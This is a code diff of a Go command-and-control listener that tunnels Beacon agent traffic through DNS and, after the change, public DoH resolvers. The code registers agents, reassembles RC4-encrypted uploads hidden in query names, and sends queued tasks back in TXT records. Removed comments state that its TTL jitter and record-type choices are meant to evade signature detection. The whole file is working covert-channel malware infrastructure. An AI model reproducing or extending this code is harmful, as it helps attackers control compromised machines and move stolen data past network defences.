@@ -21,25 +21,30 @@ import (
 	dns "github.com/miekg/dns"
 )
 
-// dnsDebug controls verbose logging for the DNS listener. It is disabled by
-// default so that release builds remain quiet. Set to true temporarily when
-// troubleshooting BeaconDNS behavior.
-const dnsDebug = true
+// dohDebug controls verbose logging for the DoH-aware DNS listener.
+// It is enabled by default while we stabilise the new behaviour behind
+// public DoH resolvers. You can turn it off for production if needed.
+const dohDebug = true
 
-type dnsFragBuf struct {
+type dohFragBuf struct {
 	total  uint32
 	buf    []byte
 	filled uint32
 }
 
-type dnsDownBuf struct {
+type dohDownBuf struct {
 	total uint32
 	off   uint32
 	buf   []byte
 }
 
-type DNS struct {
-	Config DNSConfig
+// DoHListener is a DNS authority-style listener that is designed to sit
+// behind public DoH / recursive resolvers. From the outside, it looks
+// like a normal authoritative DNS server on UDP/TCP (HostBind:PortBind).
+// From the Beacon's point of view, traffic goes through public DoH,
+// recursive resolvers, and finally reaches this listener as plain DNS.
+type DoHListener struct {
+	Config DoHConfig
 	Name   string
 	Active bool
 
@@ -48,16 +53,13 @@ type DNS struct {
 	ts        Teamserver
 
 	mu        sync.Mutex
-	upFrags   map[string]*dnsFragBuf
-	downFrags map[string]*dnsDownBuf
+	upFrags   map[string]*dohFragBuf
+	downFrags map[string]*dohDownBuf
 }
 
-func (d *DNS) Start(ts Teamserver) error {
+func (d *DoHListener) Start(ts Teamserver) error {
 	if d.Config.TTL <= 0 {
 		d.Config.TTL = 10
-	}
-	if d.Config.QType == "" {
-		d.Config.QType = "TXT"
 	}
 	if d.Config.PktSize <= 0 || d.Config.PktSize > 64000 {
 		d.Config.PktSize = 1024
@@ -74,21 +76,21 @@ func (d *DNS) Start(ts Teamserver) error {
 	d.udpServer = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
 	d.tcpServer = &dns.Server{Addr: addr, Net: "tcp", Handler: mux}
 	d.ts = ts
-	d.upFrags = make(map[string]*dnsFragBuf)
-	d.downFrags = make(map[string]*dnsDownBuf)
+	d.upFrags = make(map[string]*dohFragBuf)
+	d.downFrags = make(map[string]*dohDownBuf)
 
 	go func() {
 		if err := d.udpServer.ListenAndServe(); err != nil {
-			if dnsDebug {
-				fmt.Printf("[BeaconDNS] UDP listener error: %v\n", err)
+			if dohDebug {
+				fmt.Printf("[BeaconDoH-DNS] UDP listener error: %v\n", err)
 			}
 		}
 	}()
 
 	go func() {
 		if err := d.tcpServer.ListenAndServe(); err != nil {
-			if dnsDebug {
-				fmt.Printf("[BeaconDNS] TCP listener error: %v\n", err)
+			if dohDebug {
+				fmt.Printf("[BeaconDoH-DNS] TCP listener error: %v\n", err)
 			}
 		}
 	}()
@@ -98,7 +100,7 @@ func (d *DNS) Start(ts Teamserver) error {
 	return nil
 }
 
-func (d *DNS) Stop() error {
+func (d *DoHListener) Stop() error {
 	d.Active = false
 	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
 	defer cancel()
@@ -117,7 +119,7 @@ func (d *DNS) Stop() error {
 	return err
 }
 
-func (d *DNS) handlePutFragment(sid string, seq int, data []byte) {
+func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 	if sid == "" || len(data) == 0 {
 		_ = d.ts.TsAgentProcessData(sid, data)
 		return
@@ -131,7 +133,7 @@ func (d *DNS) handlePutFragment(sid string, seq int, data []byte) {
 	offset := binary.BigEndian.Uint32(data[4:8])
 	chunk := data[8:]
 
-	const maxUploadSize = 4 << 20 // 4MB 上行限制，与 Beacon 端 ConnectorDNS 保持一致
+	const maxUploadSize = 4 << 20 // 4MB 上行限制
 	if total == 0 || total > maxUploadSize {
 		_ = d.ts.TsAgentProcessData(sid, data)
 		return
@@ -150,7 +152,7 @@ func (d *DNS) handlePutFragment(sid string, seq int, data []byte) {
 	fb, ok := d.upFrags[key]
 	if !ok {
 		buf := make([]byte, total)
-		fb = &dnsFragBuf{total: total, buf: buf}
+		fb = &dohFragBuf{total: total, buf: buf}
 		d.upFrags[key] = fb
 	}
 	if offset >= fb.total {
@@ -164,43 +166,47 @@ func (d *DNS) handlePutFragment(sid string, seq int, data []byte) {
 	copy(fb.buf[offset:end], chunk[:n])
 	fb.filled += n
 
-	if dnsDebug {
-		fmt.Printf("[BeaconDNS] [FRAG] Reassembling sid=%s | Got %d bytes (Offset: %d / Total: %d) | Progress: %d%%\n",
+	if dohDebug {
+		fmt.Printf("[BeaconDoH-DNS] [FRAG] Reassembling sid=%s | Got %d bytes (Offset: %d / Total: %d) | Progress: %d%%\n",
 			sid, n, offset, fb.total, (fb.filled*100)/fb.total)
 	}
 
 	if fb.filled >= fb.total {
-		if dnsDebug {
-			fmt.Printf("[BeaconDNS] [UP] Reassembly Complete! sid=%s | Total: %d bytes\n", sid, fb.total)
+		if dohDebug {
+			fmt.Printf("[BeaconDoH-DNS] [UP] Reassembly Complete! sid=%s | Total: %d bytes\n", sid, fb.total)
 		}
 		_ = d.ts.TsAgentProcessData(sid, fb.buf)
 		delete(d.upFrags, key)
 	}
 }
 
-// 协议约定（简化版）：
+// 协议约定（与 DNS Beacon 保持一致）：
 // qname = <sid>.<op>.<seq>.<idx>.<data>.<...>.domain
 // 其中 data = base32(no padding, upper) 的 RC4(payload)
 // sid 建议为 8 字节 ID 的 16 位 hex 字符串，op = HI/PUT/GET
-func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
+func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 	m := new(dns.Msg)
 	m.SetReply(r)
 	m.Authoritative = true
 
-	// Randomize TTL to evade static signature detection
-	// Base TTL from config, plus a random jitter (0-60 seconds)
+	// TTL with jitter
 	baseTTL := uint32(d.Config.TTL)
 	if baseTTL == 0 {
 		baseTTL = 10
 	}
-	// Use math/rand (global instance is safe enough here)
 	ttl := baseTTL + uint32(rand.Intn(60))
 
-	// Determine response type based on the REQUEST's Qtype, not just the config.
-	// This fixes the bug where an A-record heartbeat received a TXT response.
-	reqQType := dns.TypeTXT // default
+	// 记录请求的 Qtype，用于区分 A 心跳和 TXT 下行
+	reqQType := dns.TypeTXT
 	if len(r.Question) > 0 {
 		reqQType = r.Question[0].Qtype
+	}
+
+	// 预先解析 EDNS0，用于后面动态调整 UDP 下行分片
+	opt := r.IsEdns0()
+	var udpSize int
+	if opt != nil {
+		udpSize = int(opt.UDPSize())
 	}
 
 	for _, q := range r.Question {
@@ -233,7 +239,6 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			case "api", "get":
 				op = "GET"
 			default:
-				// invalid op
 				op = ""
 			}
 
@@ -255,8 +260,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 		}
 
-		// basic anti-abuse validation: sid must be 8-char hex, and payload
-		// size should not grow unbounded beyond configured packet size.
+		// basic anti-abuse validation: sid must be 8-char hex
 		if sid != "" {
 			validSid := len(sid) == 8
 			if validSid {
@@ -269,7 +273,6 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				}
 			}
 			if !validSid {
-				// invalid sid: do not treat as a beacon frame
 				op = ""
 			}
 		}
@@ -282,13 +285,12 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			dataB = nil
 		}
 
-		if dnsDebug {
+		if dohDebug {
 			remote := ""
 			if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
 				remote = addr.IP.String()
 			}
 
-			// Enhanced Logging
 			logPrefix := "[???]"
 			logDetails := ""
 
@@ -300,7 +302,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				logDetails = fmt.Sprintf("Data Upload (len=%d)", len(dataB))
 			} else if op == "GET" {
 				if reqQType == dns.TypeA {
-					logPrefix = "[HB]" // Heartbeat
+					logPrefix = "[HB]"
 					logDetails = "Keep-Alive (A)"
 				} else {
 					logPrefix = "[DOWN]"
@@ -309,7 +311,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 
 			if sid != "" {
-				fmt.Printf("[BeaconDNS] %s %s | sid=%s seq=%d idx=%d | src=%s\n",
+				fmt.Printf("[BeaconDoH-DNS] %s %s | sid=%s seq=%d idx=%d | src=%s\n",
 					logPrefix, logDetails, sid, seq, idx, remote)
 			}
 		}
@@ -318,7 +320,6 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 		case "HI", "PUT":
 			if len(dataB) > 0 {
 				if op == "HI" {
-					// HI：尝试解出 beat 头，创建 Agent
 					keyBytes, _ := hex.DecodeString(d.Config.EncryptKey)
 					if len(keyBytes) == 16 && len(dataB) >= 8 {
 						if c, e := rc4.NewCipher(keyBytes); e == nil {
@@ -327,16 +328,14 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 							if len(fullBeat) >= 8 {
 								agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[:4]))
 								agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[4:8]))
-								// HTTP 通道会把前 8 字节 (type+id) 剥离后再传给 AgentCreate，
-								// DNS 这里也保持同样格式，只把剩余部分作为 beat 传入。
 								beat := fullBeat[8:]
 								if !d.ts.TsAgentIsExists(agentId) {
 									externalIP := ""
 									if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
 										externalIP = addr.IP.String()
 									}
-									if dnsDebug {
-										fmt.Printf("[BeaconDNS] HI create agent type=%s id=%s ip=%s\n", agentType, agentId, externalIP)
+									if dohDebug {
+										fmt.Printf("[BeaconDoH-DNS] HI create agent type=%s id=%s ip=%s\n", agentType, agentId, externalIP)
 									}
 									_, _ = d.ts.TsAgentCreate(agentType, agentId, beat, d.Name, externalIP, true)
 								}
@@ -345,19 +344,18 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						}
 					}
 				}
-				// PUT：将payload交给 TS，sid 作为逻辑会话 ID（要求 Beacon 端保持一致）
 				if op == "PUT" {
-					if dnsDebug {
-						fmt.Printf("[BeaconDNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
+					if dohDebug {
+						fmt.Printf("[BeaconDoH-DNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
 					}
-					// 应用层分片由 handlePutFragment 负责重组
 					d.handlePutFragment(sid, seq, dataB)
 					if sid != "" {
 						_ = d.ts.TsAgentSetTick(sid)
 					}
 				}
 			}
-			// ACK：返回一个最小响应（不同 QType 返回不同 RR，以降低特征）
+
+			// ACK：根据 QType 返回最小响应
 			if reqQType == dns.TypeA {
 				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("127.0.0.1").To4()}
 				m.Answer = append(m.Answer, rr)
@@ -374,8 +372,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				_ = d.ts.TsAgentSetTick(sid)
 			}
 
-			// 1. 检查并准备任务数据（无论是 A 还是 TXT 请求，都先确保 downFrags 缓存了最新任务）
-			var df *dnsDownBuf
+			var df *dohDownBuf
 			if sid != "" {
 				d.mu.Lock()
 				if buf, ok := d.downFrags[sid]; ok {
@@ -383,39 +380,36 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				}
 				d.mu.Unlock()
 
-				// 如果没有缓存或已发送完，尝试从 TS 获取新任务并缓存
 				if df == nil || df.off >= df.total {
 					maxDataSize := d.Config.PktSize * 256
 					if maxDataSize <= 0 || maxDataSize > (4<<20) {
 						maxDataSize = 4 << 20
 					}
 					if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
-						if dnsDebug {
-							fmt.Printf("[BeaconDNS] GET tasks sid=%s total=%d\n", sid, len(p))
+						if dohDebug {
+							fmt.Printf("[BeaconDoH-DNS] GET tasks sid=%s total=%d\n", sid, len(p))
 						}
 						origLen := len(p)
 						flags := byte(0)
 						payload := p
 
-						// zlib 压缩
 						const minCompressSize = 2048
 						if origLen > minCompressSize {
 							var zbuf bytes.Buffer
-							w, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
+							wz, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
 							if errW == nil {
-								if _, errC := w.Write(p); errC == nil && w.Close() == nil {
+								if _, errC := wz.Write(p); errC == nil && wz.Close() == nil {
 									comp := zbuf.Bytes()
 									if len(comp) > 0 && len(comp) < origLen {
 										payload = comp
 										flags = 1
 									}
 								} else {
-									_ = w.Close()
+									_ = wz.Close()
 								}
 							}
 						}
 
-						// 构造会话头
 						totalLen := 1 + 4 + len(payload)
 						buf := make([]byte, totalLen)
 						buf[0] = flags
@@ -424,7 +418,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						buf[3] = byte((origLen >> 16) & 0xFF)
 						buf[4] = byte((origLen >> 24) & 0xFF)
 						copy(buf[5:], payload)
-						df = &dnsDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
+						df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
 
 						d.mu.Lock()
 						d.downFrags[sid] = df
@@ -433,63 +427,59 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				}
 			}
 
-			// 2. 根据请求类型返回响应
 			var frame []byte
 
-			// 如果是 A 记录心跳请求：不返回数据，只返回 flag IP (0.0.0.1 有任务, 0.0.0.0 无任务)
 			if reqQType == dns.TypeA {
-				// 收到 A 记录心跳，说明 Agent 处于空闲或心跳状态。
-				// 这意味着之前的 TXT 下载任务（如果有）已经成功完成。
-				// 我们可以安全地清理掉已完成的下行任务缓存。
 				d.mu.Lock()
 				if oldDf, ok := d.downFrags[sid]; ok && oldDf.off >= oldDf.total {
 					delete(d.downFrags, sid)
-					if dnsDebug {
-						fmt.Printf("[BeaconDNS] [ACK] Task confirmed by A-Record | sid=%s\n", sid)
+					if dohDebug {
+						fmt.Printf("[BeaconDoH-DNS] [ACK] Task confirmed by A-Record | sid=%s\n", sid)
 					}
 				}
 				d.mu.Unlock()
 
 				hasTasks := (df != nil && df.off < df.total)
 				if hasTasks {
-					// 有任务 -> 返回 0.0.0.1，通知 Agent 切换 TXT 拉取
 					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.1").To4()}
 					m.Answer = append(m.Answer, rr)
 				} else {
-					// 无任务 -> 返回 0.0.0.0
 					rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
 					m.Answer = append(m.Answer, rr)
 				}
-				// 不生成 frame，也不增加 df.off
 			} else {
-				// 如果是 TXT (或其他) 请求：返回实际数据分片
 				if df != nil {
-					// 重传逻辑：如果 df.off >= df.total，说明 Server 认为发完了，但 Agent 还在发 TXT GET。
-					// 这意味着 Agent 没收到（丢包了）。
-					// 对于单包任务（绝大多数 shell 命令），直接重发。
-					// 对于多包任务，简单粗暴地从头重发（虽然低效，但比死锁好）。
 					if df.off >= df.total {
-						if dnsDebug {
-							fmt.Printf("[BeaconDNS] [RETRY] Agent requested data again | sid=%s | Resending from offset 0\n", sid)
+						if dohDebug {
+							fmt.Printf("[BeaconDoH-DNS] [RETRY] Agent requested data again | sid=%s | Resending from offset 0\n", sid)
 						}
 						df.off = 0
 					}
 
 					if df.off < df.total {
-						// 动态调整 Chunk Size
 						maxChunk := d.Config.PktSize
-						isTCP := false
-						if w.RemoteAddr().Network() == "tcp" {
-							isTCP = true
-						}
+						isTCP := w.RemoteAddr().Network() == "tcp"
 
 						if !isTCP {
-							// UDP 强制限制 180 字节以防截断
-							if maxChunk <= 0 || maxChunk > 180 {
-								maxChunk = 180
+							// 基于 EDNS0 的 UDP 下行分片大小估算
+							if udpSize <= 0 {
+								udpSize = 1232
+							}
+							maxTextBytes := udpSize - 300
+							if maxTextBytes < 512 {
+								maxTextBytes = 512
+							}
+							maxChunkByEDNS := (maxTextBytes * 3 / 4) - 8
+							if maxChunkByEDNS < 180 {
+								maxChunkByEDNS = 180
+							}
+							if maxChunk <= 0 || maxChunk > maxChunkByEDNS {
+								maxChunk = maxChunkByEDNS
+							}
+							if maxChunk > 4096 {
+								maxChunk = 4096
 							}
 						} else {
-							// TCP 允许大包，默认为 4096
 							if maxChunk <= 0 {
 								maxChunk = 4096
 							}
@@ -506,20 +496,17 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						binary.BigEndian.PutUint32(frame[4:8], df.off)
 						copy(frame[8:], df.buf[df.off:df.off+chunkLen])
 
-						if dnsDebug {
-							fmt.Printf("[BeaconDNS] [DOWN] Sending Fragment | sid=%s | %d bytes (Offset: %d / Total: %d) | TCP: %v\n",
+						if dohDebug {
+							fmt.Printf("[BeaconDoH-DNS] [DOWN] Sending Fragment | sid=%s | %d bytes (Offset: %d / Total: %d) | TCP: %v\n",
 								sid, chunkLen, df.off, df.total, isTCP)
 						}
 
 						df.off += chunkLen
-						// 不要在这里立即删除！等待 A 记录确认。
 					}
 				}
 
-				// 生成 TXT 响应
 				if len(frame) == 0 {
-					// 空 TXT 响应
-					if reqQType == dns.TypeA { // Should be handled above, but for safety
+					if reqQType == dns.TypeA {
 						rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
 						m.Answer = append(m.Answer, rr)
 					} else if reqQType == dns.TypeAAAA {
@@ -530,16 +517,10 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						m.Answer = append(m.Answer, rr)
 					}
 				} else {
-					// 有数据 TXT 响应
-					if reqQType == dns.TypeA {
-						// This path should NOT be reached given the logic above (A record handled separately)
-					} else if reqQType == dns.TypeAAAA {
-						// ... (AAAA logic omitted for brevity, assumption is usage of TXT)
+					if reqQType != dns.TypeTXT {
+						// 目前只在 TXT 中承载下行数据
 					} else {
-						// TXT: Base64 编码传输
 						b64Str := base64.StdEncoding.EncodeToString(frame)
-
-						// 切割成多个 255 字符的字符串，以符合 DNS TXT 规范
 						var chunks []string
 						for len(b64Str) > 255 {
 							chunks = append(chunks, b64Str[:255])
@@ -552,10 +533,8 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 					}
 				}
 			}
-			// GET 处理结束，break switch
 
 		default:
-			// 未知 op：简单 keep-alive
 			rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
 			m.Answer = append(m.Answer, rr)
 		}
